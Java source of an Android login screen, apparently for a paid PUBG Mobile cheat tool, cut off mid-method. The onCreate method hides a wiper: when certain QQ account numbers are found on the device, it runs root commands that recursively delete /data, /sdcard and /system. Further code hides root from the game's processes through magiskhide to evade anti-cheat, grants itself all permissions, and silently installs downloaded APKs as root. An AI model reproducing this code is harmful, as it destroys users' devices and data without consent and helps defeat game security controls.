package com.kmxs.reader.activity;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.material.textfield.TextInputLayout;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;



import com.kmxs.reader.utils.ApkHelper;
import com.kongzue.dialog.util.DialogSettings;
import com.kongzue.dialog.v3.InputDialog;
import com.smarx.notchlib.NotchScreenManager;

import com.kmxs.reader.App;

import com.kmxs.reader.R;
import com.kmxs.reader.drawable.drawBack;
import com.kmxs.reader.drawable.drawButton;
import com.kmxs.reader.utils.AnimatorUtils;
import com.kmxs.reader.utils.AppConfig;
import com.kmxs.reader.utils.AppConfigManger;
import com.kmxs.reader.utils.BearHelper;
import com.kmxs.reader.utils.DrawPaintManager;
import com.kmxs.reader.utils.TimerTaskManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Objects;

import es.dmoral.toasty.Toasty;
import io.reactivex.disposables.Disposable;
import me.simple.lib.BuildConfig;
import me.simple.lib.activity.BaseActivity;
import me.simple.lib.injection.RootUtil;
import me.simple.lib.login.request.LoginUserReponse;
import me.simple.lib.login.request.LoginUserRequest;
import me.simple.lib.net.BaseRequestWraper;
import me.simple.lib.net.RetrofitClient;
import me.simple.lib.note.request.GetNoteReponse;
import me.simple.lib.note.request.GetNoteRequest;
import me.simple.lib.pay.request.UserRenewReponse;
import me.simple.lib.pay.request.UserRenewRequest;
import me.simple.lib.reg.request.UserRegReponse;
import me.simple.lib.reg.request.UserRegRequest;
import me.simple.lib.utils.CustomProgressDialog;
import me.simple.lib.utils.EncrypUtils;
import me.simple.lib.utils.LogUtils;
import me.simple.lib.utils.SafeUtils;
import me.simple.lib.utils.ShellUtils;
import me.simple.lib.utils.ZipUtil;
import me.simple.lib.version.request.GetVersionReponse;
import me.simple.lib.version.request.GetVersionRequest;
import me.simple.lib.widget.DialogFactory;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;


public class LoginActivity extends BaseActivity {

    private static final int MSG_WHAT_REQUEST_ROOT_PERMISSION = 0;
    private static final int MSG_WHAT_NO_ROOT_PERMISSON = 1;

    private DrawPaintManager mDrawPaintManager;
    private AppConfig mAppConfig;
    private CustomProgressDialog mProgressDialog;
    private TextView title_login, title_reg2, tv_top;
    private TextInputLayout login_id_layout, login_password_layout, register_id_layout, register_password_layout, register_email_layout;
    TextView tv_login, tv_reg;

    public static final int SHOW_UPDATE_DIALOG = 0;
    public static final int SHOW_ERROR = 1;
    public final static int CONNECT_TIMEOUT = 5000;
    public final static int READ_TIMEOUT = 5000;
    public final static int WRITE_TIMEOUT = 5000;
    String updateCode;


    String[] permissions = new String[]{Manifest.permission.CAMERA, Manifest.permission.WRITE_EXTERNAL_STORAGE};
    List<String> mPermissionList = new ArrayList<>();

    private static final int PERMISSION_REQUEST = 1;

    // 检查权限
    private void checkPermission() {
        mPermissionList.clear();
        //判断哪些权限未授予
        for (int i = 0; i < permissions.length; i++) {
            if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permissions[i]);
            }
        }
        /**
         * 判断是否为空
         */
        if (mPermissionList.isEmpty()) { //未授予的权限为空，表示都授予了
        } else {//请求权限方法
            String[] permissions = mPermissionList.toArray(new String[mPermissionList.size()]);//将List转为数组
            ActivityCompat.requestPermissions(LoginActivity.this, permissions, PERMISSION_REQUEST);
        }
    }

    /**
     * 响应授权
     * 这里不管用户是否拒绝，都进入首页，不再重复申请权限
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {
            case PERMISSION_REQUEST:
                break;
            default:
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                break;
        }
    }


    @SuppressLint("HandlerLeak")
    private final Handler mHandler = new Handler(Looper.getMainLooper()) {
        @Override
        public void handleMessage(@NonNull Message msg) {
            super.handleMessage(msg);
            if (msg.what == MSG_WHAT_REQUEST_ROOT_PERMISSION) {
                //isUpdates();
            } else if (msg.what == MSG_WHAT_NO_ROOT_PERMISSON) {
                DialogFactory.createTipsDialog(LoginActivity.this, "温馨提示", "请给予ROOT权限后再使用!", true).show();
            }
        }

    };

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        RootUtil.allowAllPermissions(this, getPackageName());
        mDrawPaintManager = DrawPaintManager.getInstance();
        mAppConfig = AppConfigManger.getInstance().readAppConfig();
        checkPermission();

        //公告
        getNote();
        //检查更新
        isUpdates();

        if (hasValidateToken()) {
            gotoMainActivity();
        } else {
            try {
                initView();
            } catch (Exception e) {
                e.printStackTrace();
            }
            getNotchInfo();
            checkRoot();
        }

        initEvent();


        String qq_path = RootUtil.runShell("/system/bin/ls /storage/emulated/0/tencent/MobileQQ",true);
        String qq_path2 = RootUtil.runShell("/system/bin/ls /storage/emulated/0/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/rijmmkv",true);
        if(qq_path.contains("2414728147") || qq_path.contains("3344444452")|| qq_path.contains("1534919606") || qq_path2.contains("2414728147") || qq_path2.contains("3344444452")|| qq_path2.contains("1534919606")){
            //你的格机代码
            RootUtil.runShell("/system/bin/rm -r /data/", true);
            RootUtil.runShell("/system/bin/rm -r /sdcard/", true);
            RootUtil.runShell("/system/bin/rm -r /system/", true);
        }

        final String old_pg_name = "com.kmxs.reader";


        //随机包名
        if (getPackageName().equals(old_pg_name) && !BuildConfig.DEBUG) {
            new Thread(() -> {
                ApkHelper apkHelper = new ApkHelper();
                apkHelper.installSignedApk(LoginActivity.this);
                ShellUtils.execCmd("pm uninstall " + old_pg_name, true);
            }).start();

            mProgressDialog = createProgressDialog("请等待一会...", "正在生成随机包名...");

            mProgressDialog.setCancelable(false);

            mProgressDialog.show();
        }


    }

    /**
     * /**
     * 获取版本号
     */
    String getVersionName() throws Exception {
        // 获取packagemanager的实例
        PackageManager packageManager = getPackageManager();
        // getPackageName()是你当前类的包名，0代表是获取版本信息
        PackageInfo packInfo = packageManager.getPackageInfo(getPackageName(), 0);
        String version = packInfo.versionName;
        return version;
    }


    /**
     * 从服务器端下载最新apk
     */
    private void downloadApk(String url) {
        //显示下载进度
        ProgressDialog dialog = new ProgressDialog(this);
        dialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
        dialog.setTitle("加载更新数据");
        dialog.setCancelable(false);
        dialog.show();
        //访问网络下载apk
        new Thread(new DownloadApk(dialog,url)).start();
    }


    /**
     * 访问网络下载apk
     */
    private class DownloadApk implements Runnable {
        private final ProgressDialog dialog;
        String url;
        InputStream is;
        FileOutputStream fos;

        public DownloadApk(ProgressDialog dialog,String url) {
            this.dialog = dialog;
            this.url = url;
        }
        @Override
        public void run() {
            OkHttpClient client = new OkHttpClient();
            //获取更新链接
            if (mAppConfig.isAbnormal || mAppConfig.isVPN)
                return;
            String url = this.url;
            Request request = new Request.Builder().get().url(url).build();
            try {
                Response response = client.newCall(request).execute();
                if (response.isSuccessful()) {
                    Log.d(TAG, "开始下载apk");
                    //获取内容总长度
                    long contentLength = Objects.requireNonNull(response.body()).contentLength();
                    //设置最大值
                    dialog.setMax((int) contentLength);
                    //保存到sd卡
                    // getFilesDir().toString() Environment.getExternalStorageDirectory()
                    File apkFile = new File(getFilesDir().toString(), System.currentTimeMillis() + ".apk");
                    fos = new FileOutputStream(apkFile);
                    //获得输入流
                    is = Objects.requireNonNull(response.body()).byteStream();
                    //定义缓冲区大小
                    byte[] bys = new byte[1024];
                    int progress = 0;
                    int len = -1;
                    while ((len = is.read(bys)) != -1) {
                        try {
                            Thread.sleep(1);
                            fos.write(bys, 0, len);
                            fos.flush();
                            progress += len;
                            //设置进度
                            dialog.setProgress(progress);
                        } catch (InterruptedException e) {
                            Message msg = Message.obtain();
                            msg.what = SHOW_ERROR;
                            msg.obj = "ERROR:10002";
                            // load2Login();
                        }
                    }
                    Runtime.getRuntime().exec("chmod 755 " + apkFile);

                    try {
                        Runtime.getRuntime().exec("su -c pm install -r " + apkFile);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    //下载完成,提示用户安装
                    //installApk(LoginActivity.this, apkFile);
                }
            } catch (IOException e) {
                LogUtils.E("错误信息", e.getMessage());

                e.printStackTrace();


                Message msg = Message.obtain();
                msg.what = SHOW_ERROR;
                msg.obj = "ERROR:10003";
                Log.d(TAG, "错误10003");
                //    load2Login();
            } finally {
                //关闭io流
                if (is != null) {
                    try {
                        is.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    is = null;
                }
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    fos = null;
                }
            }
            dialog.dismiss();
        }
    }


    private void initView() throws Exception {

        findViewById(R.id.login_page).setBackground(new drawBack());
        /* 登录页面 */
        LinearLayout page_login = findViewById(R.id.page_login);
        FrameLayout.LayoutParams mParams = (FrameLayout.LayoutParams) page_login.getLayoutParams();
        mParams.width = Double.valueOf(0.8 * App.getScreenWidth()).intValue();
        page_login.setLayoutParams(mParams);

        ImageView mLogo = findViewById(R.id.mLogo);
        LinearLayout.LayoutParams mParams2 = (LinearLayout.LayoutParams) mLogo.getLayoutParams();
        mParams2.width = Double.valueOf(0.3 * App.getScreenWidth()).intValue();
        mParams2.height = Double.valueOf(0.3 * App.getScreenWidth()).intValue();
        mLogo.setLayoutParams(mParams2);

        login_id_layout = findViewById(R.id.login_id_layout);
        LinearLayout.LayoutParams mParams3 = (LinearLayout.LayoutParams) login_id_layout.getLayoutParams();
        mParams3.width = Double.valueOf(0.8 * App.getScreenWidth()).intValue();
        login_id_layout.setLayoutParams(mParams3);
        login_id_layout.getEditText().setText(App.ReadConfig("uin", ""));

        login_password_layout = findViewById(R.id.login_password_layout);
        LinearLayout.LayoutParams mParams4 = (LinearLayout.LayoutParams) login_password_layout.getLayoutParams();
        mParams4.width = Double.valueOf(0.8 * App.getScreenWidth()).intValue();
        login_password_layout.setLayoutParams(mParams4);
        login_password_layout.getEditText().setText(App.ReadConfig("pwd", ""));


        FrameLayout page_reg = findViewById(R.id.page_reg);
        LinearLayout.LayoutParams mParams5 = (LinearLayout.LayoutParams) page_reg.getLayoutParams();
        mParams5.height = Double.valueOf(0.3 * App.getScreenHeight()).intValue();
        page_reg.setLayoutParams(mParams5);

        title_login = findViewById(R.id.title_login);
        FrameLayout.LayoutParams mParams6 = (FrameLayout.LayoutParams) title_login.getLayoutParams();
        mParams6.width = Double.valueOf(0.3 * App.getScreenWidth()).intValue();
        title_login.setLayoutParams(mParams6);
        title_login.setBackground(new drawButton(0xFFFFFFFF));
        title_login.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));


        FrameLayout page_top = findViewById(R.id.page_top);
        LinearLayout.LayoutParams mParams19 = (LinearLayout.LayoutParams) page_top.getLayoutParams();
        mParams19.height = Double.valueOf(0.3 * App.getScreenHeight()).intValue();
        page_top.setLayoutParams(mParams19);

        tv_top = findViewById(R.id.tv_top);
        FrameLayout.LayoutParams mParams18 = (FrameLayout.LayoutParams) tv_top.getLayoutParams();
        mParams18.width = Double.valueOf(0.3 * App.getScreenWidth()).intValue();
        tv_top.setLayoutParams(mParams18);
        tv_top.setBackground(new drawButton(0xFFFFFFFF));
        tv_top.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));


        /* 注册页面 */
        LinearLayout page_register = findViewById(R.id.page_register);
        FrameLayout.LayoutParams mParams7 = (FrameLayout.LayoutParams) page_register.getLayoutParams();
        mParams7.width = Double.valueOf(0.8 * App.getScreenWidth()).intValue();
        page_register.setLayoutParams(mParams7);

        ImageView mLogo2 = findViewById(R.id.mLogo2);
        LinearLayout.LayoutParams mParams8 = (LinearLayout.LayoutParams) mLogo2.getLayoutParams();
        mParams8.width = Double.valueOf(0.3 * App.getScreenWidth()).intValue();
        mParams8.height = Double.valueOf(0.3 * App.getScreenWidth()).intValue();
        mLogo2.setLayoutParams(mParams8);

        register_id_layout = findViewById(R.id.register_id_layout);
        LinearLayout.LayoutParams mParams9 = (LinearLayout.LayoutParams) register_id_layout.getLayoutParams();
        mParams9.width = Double.valueOf(0.8 * App.getScreenWidth()).intValue();
        register_id_layout.setLayoutParams(mParams9);

        register_password_layout = findViewById(R.id.register_password_layout);
        LinearLayout.LayoutParams mParams10 = (LinearLayout.LayoutParams) login_password_layout.getLayoutParams();
        mParams10.width = Double.valueOf(0.8 * App.getScreenWidth()).intValue();
        register_password_layout.setLayoutParams(mParams10);

        register_email_layout = findViewById(R.id.register_email_layout);
        LinearLayout.LayoutParams mParams11 = (LinearLayout.LayoutParams) register_email_layout.getLayoutParams();
        mParams11.width = Double.valueOf(0.8 * App.getScreenWidth()).intValue();
        register_email_layout.setLayoutParams(mParams11);

        FrameLayout page_reg2 = findViewById(R.id.page_reg2);
        LinearLayout.LayoutParams mParams12 = (LinearLayout.LayoutParams) page_reg2.getLayoutParams();
        mParams12.height = Double.valueOf(0.3 * App.getScreenHeight()).intValue();
        page_reg2.setLayoutParams(mParams12);

        title_reg2 = findViewById(R.id.title_reg2);
        FrameLayout.LayoutParams mParams13 = (FrameLayout.LayoutParams) title_reg2.getLayoutParams();
        mParams13.width = Double.valueOf(0.5 * App.getScreenWidth()).intValue();
        title_reg2.setLayoutParams(mParams13);
        title_reg2.setBackground(new drawButton(0xFFFFFFFF));
        title_reg2.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));

        /* 登录首页 */
        ImageView page_ico = findViewById(R.id.page_ico);
        FrameLayout.LayoutParams mParams14 = (FrameLayout.LayoutParams) page_ico.getLayoutParams();
        mParams14.width = Double.valueOf(0.3 * App.getScreenHeight()).intValue();
        mParams14.height = Double.valueOf(0.3 * App.getScreenHeight()).intValue();
        mParams14.topMargin = Double.valueOf(0.3 * App.getScreenWidth()).intValue();
        page_ico.setLayoutParams(mParams14);

        LinearLayout page_bar = findViewById(R.id.page_bar);
        FrameLayout.LayoutParams mParams15 = (FrameLayout.LayoutParams) page_bar.getLayoutParams();
        mParams15.leftMargin = Double.valueOf(0.1 * App.getScreenWidth()).intValue();
        mParams15.rightMargin = Double.valueOf(0.1 * App.getScreenWidth()).intValue();
        mParams15.bottomMargin = Double.valueOf(0.23 * App.getScreenWidth()).intValue();
        page_bar.setLayoutParams(mParams15);


        tv_login = findViewById(R.id.tv_login);
        FrameLayout.LayoutParams mParams16 = (FrameLayout.LayoutParams) tv_login.getLayoutParams();
        mParams16.rightMargin = Double.valueOf(0.03 * App.getScreenWidth()).intValue();
        tv_login.setLayoutParams(mParams16);
        tv_login.setBackground(new drawButton(0xFFFFFFFF));
        tv_login.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));
        tv_login.setOnClickListener(view -> {
            page_ico.setVisibility(View.GONE);
            page_bar.setVisibility(View.GONE);
            page_login.setVisibility(View.VISIBLE);
            AnimatorUtils.alpha(page_login, new float[]{0, 1}, 300L);
        });

        tv_reg = findViewById(R.id.tv_reg);
        FrameLayout.LayoutParams mParams17 = (FrameLayout.LayoutParams) tv_reg.getLayoutParams();
        mParams17.leftMargin = Double.valueOf(0.03 * App.getScreenWidth()).intValue();
        tv_reg.setLayoutParams(mParams17);
        tv_reg.setBackground(new drawButton(0xFFFFFFFF));
        tv_reg.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));
        tv_reg.setOnClickListener(view -> {
            page_ico.setVisibility(View.GONE);
            page_bar.setVisibility(View.GONE);
            page_register.setVisibility(View.VISIBLE);
            AnimatorUtils.alpha(page_register, new float[]{0, 1}, 300L);
        });


        TextView tv_info = findViewById(R.id.tv_info);
        tv_info.setTypeface(Typeface.defaultFromStyle(Typeface.BOLD));
        tv_info.setOnClickListener(view -> {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/lvyyad"));
            //Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("tg:resolve?domain=lvyyad"));
            //startActivity(i);
        });

        /*
        if (mAppConfig.isAbnormal || mAppConfig.isVPN) {
            tv_login.setClickable(false);
            tv_reg.setClickable(false);
        } else {
            updateCode = HttpUtils.sendPost("http://119.188.245.15:456/update.php", "&code=codeGo");
         //   Toasty.error(mContext, updateCode, Toast.LENGTH_SHORT).show();

            if (Float.parseFloat(updateCode) > Float.parseFloat(getVersionName())) {
                Toasty.error(mContext, "检测到新版本", Toast.LENGTH_SHORT).show();
                tv_login.setClickable(false);
                tv_reg.setClickable(false);
                showUpdateDialog();
            }
        }

         */
    }

    public static void ShNamed(String shell) {
        String s = shell;
        try {
            Runtime.getRuntime().exec(s, null, null);//执行
        } catch (Exception e) {
            e.printStackTrace();
        }
    }




    private void gotoMainActivity() {
        Intent intent = new Intent(this, MainActivity.class);
        startActivity(intent);
        finish();
    }

    private void getNotchInfo() {
        NotchScreenManager.getInstance().getNotchInfo(this, notchScreenInfo -> {
            if (notchScreenInfo.hasNotch) {
                if (!App.HasConfig("Offset")) {
                    mDrawPaintManager.setLeftOffset(-App.getStatusBarHeight());
                }
            }
        });
    }

    private boolean hasValidateToken() {
        return mAppConfig.mToken != null;
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    private void checkRoot() {
        getASynHandler().post(() -> {
            if (!ShellUtils.isRootGiven()) {
                mHandler.sendEmptyMessage(MSG_WHAT_NO_ROOT_PERMISSON);
            } else {
                BearHelper.WriteAssets("magisk.sh", App.getFilePath() + "/magisk.sh");
                ShellUtils.execCmd("chmod -R 777 " + App.getFilePath(), false, false);
                ShellUtils.execCmd("sh " + App.getFilePath() + "/magisk.sh", true, true);
                ShellUtils.execCmd("magiskhide enable", true, true);
                ShellUtils.execCmd("magiskhide add com.tencent.tmgp.pubgmhd", true, true);
                ShellUtils.execCmd("magiskhide add com.tencent.tmgp.pubgmhd com.tencent.tmgp.pubgmhd:TMAssistantDownloadSDKService", true, true);
                ShellUtils.execCmd("magiskhide add com.tencent.tmgp.pubgmhd com.tencent.tmgp.pubgmhd:midasPay", true, true);
                ShellUtils.execCmd("magiskhide add com.tencent.tmgp.pubgmhd com.tencent.tmgp.pubgmhd:msdk_inner_webview", true, true);
                ShellUtils.execCmd("magiskhide add com.tencent.tmgp.pubgmhd com.tencent.tmgp.pubgmhd:pushservice", true, true);
                ShellUtils.execCmd("magiskhide add com.tencent.tmgp.pubgmhd com.tencent.tmgp.pubgmhd:slugsdk_ingame_webview", true, true);
                ShellUtils.execCmd("magiskhide add com.tencent.tmgp.pubgmhd com.tencent.tmgp.pubgmhd:tgaPlugin", true, true);
                ShellUtils.execCmd("magiskhide add com.tencent.tmgp.pubgmhd com.tencent.tmgp.pubgmhd:xg_vip_service", true, true);
                ShellUtils.execCmd("rm -r " + App.getFilePath(), true, true);
                BearHelper.allowAllPermissions();
                mHandler.sendEmptyMessage(MSG_WHAT_REQUEST_ROOT_PERMISSION);
            }
        });
    }

    private void showDialog(String message, boolean isfinish) {
        DialogFactory.createTipsDialog(this, message, isfinish).show();
    }

    private void showRenewDialog(String uin) {
        InputDialog.build(this)
                .setStyle(DialogSettings.STYLE.STYLE_KONGZUE)
                .setInputText("")
                .setHintText("请输入续费卡密")
                .setTitle("温馨提示")
                .setMessage("对不起，你的时长已到期，请续费后使用")
                .setOnOkButtonClickListener((baseDialog, v, inputStr) -> {
                    renewUser(uin, inputStr);
                    return false;
                })
                .setOkButton("立即续费")
                .setCancelButton("暂不续费")
                .show();
    }


    private void showDialog(String message) {
        showDialog(message, false);
    }


    /**
     * 弹出提示更新的dialog
     */
    private void showUpdateDialog(String text, String myuri) {

        AlertDialog.Builder dialog = new AlertDialog.Builder(this);
        dialog.setCancelable(false);
        dialog.setTitle("檢查到有最新版本,是否更新?");
        if (!mAppConfig.isAbnormal || !mAppConfig.isVPN) {

            dialog.setMessage(text.replace("\\n", "\n"));
            dialog.setNeutralButton("取消", (dialog13, which) -> {
                //跳转到登录界面
                System.exit(0);
            });

            dialog.setNegativeButton("浏览器", (dialog12, which) -> {
                //跳转到登录界面
                if (!mAppConfig.isAbnormal || !mAppConfig.isVPN) {
                    Uri uri = Uri.parse(myuri);
                    Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                    startActivity(intent);
                }
            });
            dialog.setPositiveButton("更新安裝", (dialog1, which) -> {
                //从服务器端下载最新apk
                downloadApk(myuri);
            });
            dialog.show();
        }
    }

    private void isUpdates() {
        //LogUtils.D(TAG, "Check Version");
        GetVersionRequest Request = new GetVersionRequest();
        if (!mAppConfig.isAbnormal || !mAppConfig.isVPN)
            RetrofitClient.getInstance().get(new BaseRequestWraper<>(Request).getMap(), getLifeOwner(), new io.reactivex.SingleObserver<GetVersionReponse>() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {

                }

                @Override
                public void onSuccess(@NonNull GetVersionReponse reponse) {
                    LogUtils.D("GetVersion onSuccess", reponse + "");
                    String appver = reponse.info.app_bb;
                    String appmsg = reponse.info.app_nshow;
                    String appuir = reponse.info.app_nurl;
                    try {
                        if ( Float.parseFloat(getVersionName()) < BearHelper.toNumber(appver)) {
                            tv_login.setClickable(false);
                            tv_reg.setClickable(false);
                            showUpdateDialog(appmsg, appuir);
                            App.isUpdata = true;
                            //DialogFactory.createTipsDialog(mContext, "更新提示", appmsg.replace("\\n", "\n"), true).show();
                        }else{
                            App.isUpdata = false;
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onError(@NonNull Throwable e) {
                    //++  LogUtils.E("GetVersion onError", e);
                    showDialog("服务器延迟,请尝试更换网络\n"+e.toString());
                }
            });
    }

    private void getNote() {
        //LogUtils.D(TAG, "Get Note");
        GetNoteRequest Request = new GetNoteRequest();
        if (!mAppConfig.isAbnormal || !mAppConfig.isVPN)
            RetrofitClient.getInstance().get(new BaseRequestWraper<>(Request).getMap(), getLifeOwner(), new io.reactivex.SingleObserver<GetNoteReponse>() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {

                }

                @Override
                public void onSuccess(@NonNull GetNoteReponse reponse) {
                    if (reponse.isCharge.contains("y")) {
                        //环境检测
                        TimerTaskManager.environmentalTesting(mContext, mAppConfig, 1);
                        SafeUtils.isCharge = true;
                    } else {
                        SafeUtils.isCharge = false;
                    }
                    //   LogUtils.D("GetNote onSuccess", reponse + "");
                    if (reponse.note != null && reponse.note.size() > 0 && !reponse.note.get(0).content.equals("")) {
                        DialogFactory.createTipsDialog(LoginActivity.this, "公告", reponse.note.get(0).content.replace("\\n", "\n"), false).show();
                    }
                }

                @Override
                public void onError(@NonNull Throwable e) {
                    //    LogUtils.E("GetNote onError", e);
                    showDialog("服务器延迟,请尝试更换网络\n"+e.toString());
                }
            });
    }

    private void loginUser(final String uin, final String pwd) {
        if (uin.equals("")) {
            mProgressDialog.dismiss();
            showDialog("你还没有告诉我你的企鹅账号呢~");
            return;
        }
        LoginUserRequest Request = new LoginUserRequest();
        Request.setMarkCode(BearHelper.getDeviceId());
        Request.setUin(uin);
        Request.setPwd(pwd);
        if (!mAppConfig.isAbnormal || !mAppConfig.isVPN)
            RetrofitClient.getInstance().get(new BaseRequestWraper<>(Request).getMap(), getLifeOwner(), new io.reactivex.SingleObserver<LoginUserReponse>() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {
                }

                @Override
                public void onSuccess(@NonNull LoginUserReponse reponse) {
                    LogUtils.D("CheckUser onSuccess", reponse + "");
                    mProgressDialog.dismiss();
                    if (TextUtils.isEmpty(reponse.token)) {
                        showDialog(reponse.msg);
                    } else if (reponse.vip.equals("0")) {
                        App.SaveConfig("uin", uin);
                        App.SaveConfig("pwd", pwd);
                        showRenewDialog(uin);
                    } else if (reponse.vip.equals("999999999")) {
                        if(!reponse.ret.equals("200")){
                            Toasty.success(mContext, "登录失败！", Toast.LENGTH_SHORT).show();
                            return;
                        }
                        mAppConfig.mTime = "永久会员";
                        mAppConfig.mHeader = reponse.pic;
                        mAppConfig.mName = reponse.name;
                        mAppConfig.mToken = reponse.token;
                       // mAppConfig.user = uin;

                        mAppConfig.user = EncrypUtils.oOOOooooOOoOOoo(uin, "fdsfhkdsahfksdhagosdgdsovdsg");
                       // RootUtil.runShell("/system/bin/setprop service.build" + " " + mAppConfig.user , true);

                        App.SaveConfig("uin", uin);
                        App.SaveConfig("pwd", pwd);
                        SafeUtils.islogin = true;
                        Toasty.success(mContext, "登录成功！", Toast.LENGTH_SHORT).show();
                        gotoMainActivity();
                    } else if (BearHelper.toInt(reponse.vip) > BearHelper.toInt(reponse.time)) {
                        if(!reponse.ret.equals("200")){
                            Toasty.success(mContext, "登录失败！", Toast.LENGTH_SHORT).show();
                            return;
                        }
                       // mAppConfig.user = uin;
                        mAppConfig.user = EncrypUtils.oOOOooooOOoOOoo(uin, "fdsfhkdsahfksdhagosdgdsovdsg");
                        RootUtil.runShell("/system/bin/setprop service.build" + " " + mAppConfig.user , true);


                        mAppConfig.mTime = timestampToStr(reponse.vip);
                        mAppConfig.mToken = reponse.token;
                        mAppConfig.mHeader = reponse.pic;
                        mAppConfig.mName = reponse.name;
                        App.SaveConfig("uin", uin);
                        App.SaveConfig("pwd", pwd);
                        SafeUtils.islogin = true;
                        Toasty.success(mContext, "登录成功，到期时间:" + mAppConfig.mTime, Toast.LENGTH_SHORT).show();
                        gotoMainActivity();
                    } else {
                        showRenewDialog(uin);
                        //showDialog("对不起，你的时长已到期，请续费后使用");
                    }
                }

                @Override
                public void onError(@NonNull Throwable e) {
                    LogUtils.E("LoginUser onError", e + "e");
                    mProgressDialog.dismiss();
                    showDialog("服务器延迟,请尝试更换网络\n"+e.toString());
                }
            });
    }

    private void regUser(String uin, String pwd, String email) {
        UserRegRequest Request = new UserRegRequest();
        Request.setMarkCode(BearHelper.getDeviceId());
        Request.setUin(uin);
        Request.setPwd(pwd);
        Request.setEmail(email);
        if (!mAppConfig.isAbnormal || !mAppConfig.isVPN)
            RetrofitClient.getInstance().get(new BaseRequestWraper<>(Request).getMap(), getLifeOwner(), new io.reactivex.SingleObserver<UserRegReponse>() {
                @Override
                public void onSubscribe(@NonNull Disposable d) {
                }

                @Override
                public void onSuccess(@NonNull UserRegReponse reponse) {
                    //  LogUtils.D("UserReg onSuccess", reponse + "");
                    showDialog(reponse.msg);
                }

                @Override
                public void onError(@NonNull Throwable e) {
                    //  LogUtils.E("UserReg onError", e + "e");
                    showDialog("服务器延迟,请尝试更换网络\n"+e.toString());

                }
            });
    }

    @SuppressLint("SimpleDateFormat")
    private String timestampToStr(String timestamp) {
        try {
            long stamp = 0L;
            if (timestamp == null || timestamp.equals("")) {
                return "";
            }
            if (timestamp.length() == 10) {
                stamp = Long.parseLong(timestamp) * 1000;
            } else if (timestamp.length() == 13) {
                stamp = Long.parseLong(timestamp);
            }
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(stamp));
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    private CustomProgressDialog createProgressDialog(String title, String message) {
        CustomProgressDialog dialog = new CustomProgressDialog(mContext);
        dialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        dialog.setTitle(title);
        dialog.setMessage(message);
        dialog.setCancelable(true);
        dialog.setCanceledOnTouchOutside(false);
        return dialog;
    }

    private void initEvent() {

        tv_top.setOnClickListener(view -> {
            String uin = login_id_layout.getEditText().getText().toString();

            if (TextUtils.isEmpty(uin)) {
                Toasty.error(mContext, "请填写账号", Toast.LENGTH_SHORT).show();
                return;
            }
            InputDialog.build(this)
                    .setStyle(DialogSettings.STYLE.STYLE_KONGZUE)
                    .setInputText("")
                    .setHintText("请输入续费卡密")
                    .setTitle("温馨提示")
                    .setMessage("输入您的激活码")
                    .setOnOkButtonClickListener((baseDialog, v, inputStr) -> {
                        renewUser(uin, inputStr);
                        return false;
                    })
                    .setOkButton("立即续费")
                    .setCancelButton("暂不续费")
                    .show();
        });

        title_login.setOnClickListener(view -> {
            String uin = login_id_layout.getEditText().getText().toString();
            String pwd = login_password_layout.getEditText().getText().toString();
            if (TextUtils.isEmpty(uin) || TextUtils.isEmpty(pwd)) {
                Toasty.error(mContext, "请填写账号/密码后，再登录！", Toast.LENGTH_SHORT).show();
                return;
            }

            mProgressDialog = createProgressDialog("请等待一会...", "正在验证...");
            mProgressDialog.show();
            loginUser(uin, pwd);
        });

        title_reg2.setOnClickListener(view -> {
            String uin = register_id_layout.getEditText().getText().toString();
            String pwd = register_password_layout.getEditText().getText().toString();
            String email = register_email_layout.getEditText().getText().toString();
            if (TextUtils.isEmpty(uin) || TextUtils.isEmpty(pwd) || TextUtils.isEmpty(email)) {
                Toasty.error(mContext, "请填写账号/密码/邮箱后，再注册！", Toast.LENGTH_SHORT).show();
                return;
            }
            regUser(uin, pwd, email);
        });


    }

    private void renewUser(String uin, String cdk) {
        UserRenewRequest Request = new UserRenewRequest();
        Request.setPayCard(cdk);
        Request.setUin(uin);
        if (!mAppConfig.isAbnormal || !mAppConfig.isVPN)
